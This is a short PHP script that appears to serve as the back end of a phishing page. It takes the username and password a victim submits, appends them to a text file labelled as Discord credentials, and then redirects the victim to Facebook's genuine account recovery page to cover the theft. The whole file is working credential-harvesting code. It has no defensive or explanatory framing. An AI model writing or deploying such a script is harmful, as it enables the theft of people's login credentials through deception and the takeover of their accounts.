<?php
file_put_contents("../usernames.txt", "Discord Username: " . $_POST['username'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);

header('Location: https://www.facebook.com/recover/initiate/');
exit();
?>